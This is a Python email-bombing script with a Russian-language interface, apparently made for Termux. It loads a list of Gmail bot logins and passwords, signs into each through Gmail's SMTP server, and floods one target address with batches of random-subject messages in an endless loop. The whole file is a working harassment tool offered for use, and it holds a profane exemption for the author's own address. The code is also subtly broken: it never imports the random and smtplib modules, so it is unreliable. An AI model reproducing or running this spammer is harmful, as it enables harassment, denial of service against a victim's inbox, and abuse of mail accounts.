from time import sleep
import sys
import colorama
import os
import socket
from termcolor import colored
count = 0
colorama.init(autoreset=True)

clear = 'clear'
os.system(clear)

def banner():
    print(colored("""  ____  _____ ____                 _ _  """, "red"))
    print(colored(""" |  _ \|  ___/ ___|_ __ ___   __ _(_) | """, "red"))
    print(colored(""" | | | | |_ | |  _| '_ ` _ \ / _` | | | """, "red"))                                                                                  
    print(colored(""" | |_| |  _|| |_| | | | | | | (_| | | | """, "white"))
    print(colored(""" |____/|_|   \____|_| |_| |_|\__,_|_|_| """, "white"))
    print(colored("""                                        """, "white"))
    print("[Создал - @BatyaRimskiy1 для Termux-One]")
    print('\n')
banner()
def clean():
    if os.name == 'nt':                                                                                                                                        
        clear = os.system('cls')
    else:
        clear = os.system('clear')
def check_connection():
    clean()
    banner()
    print(colorama.Fore.GREEN+"\t    Идет проверка подключения, пожалуйста подождите...")
    try:
        socket.create_connection(('www.google.com',80))
    except:
        clean()
        banner()
        print(colorama.Fore.GREEN+"\t    Пожалуйста, подключитесь к интернету")
        sleep(3)
        sys.exit()
def subject():
    subject = random.randint(1,10000000)
    return subject
def spam(login,passw,to):
    global count
    for y in range(49):
        s = smtplib.SMTP('smtp.gmail.com:587')
        s.ehlo()
        s.starttls()
        TO = to
        FROM = login
        text = str(subject())
        SUBJECT = subject()
        passw = passw
        s.login(login,passw)

        msg = "\r\n".join((
            "From: %s" % FROM,
            "To: %s" % TO,
            "Subject: %s" % SUBJECT,
            "",
            text
        ))
        count += 1
        s.sendmail(login,to,msg)
        clean()
        banner()
        print(colorama.Fore.CYAN+'\tTarget:','\t',to)
        print(colorama.Fore.CYAN+'\tMessages sent:','\t',count)
        s.quit()
target = input('Target: ')
if target == 'krupinad8@gmail.com':
    print('\t    Fuck you')
    sleep(2)
    sys.exit()
check_connection()
clean()
banner()
print(colorama.Fore.GREEN+'\t    Загрузка botslist...')
try:
    logs = open('bots.fb','r')
except FileNotFoundError:
    clean()
    banner()
    print(colorama.Fore.RED+'\t    Botlist не найден')
botlogs = logs.read().split(',')
if botlogs[0] == '':
    clean()
    banner()
    print(colorama.Fore.RED+'\t     Botlist пуст!')
    sleep(5)
    sys.exit()
passwords = []
logins = []
alls = []
for x in botlogs:
    index_of_element = botlogs.index(x)
    if str(index_of_element/2)[2] != '0':
        passwords.append(x)
    if str(index_of_element/2)[2] == '0':
        logins.append(x)
for y in logins:
    index_login = logins.index(y)
    index_password = index_login
    alls.append(list((logins[index_login],passwords[index_password])))
while True:
    for i in alls:
        try:
            login_for_spam = i[0]
            password_for_spam = i[1]
            spam(login_for_spam,password_for_spam,target)
        except smtplib.SMTPAuthenticationError:
            continue
        except KeyboardInterrupt:
            clean()
            banner()
            print(colorama.Fore.RED+'\t    Работает...')
            sleep(2)
            sys.exit()
        except smtplib.SMTPRecipientsRefused:
            clean()
            banner()
            print(colorama.Fore.RED+'\t    Цель gmail, не существует!')
            sleep(2)
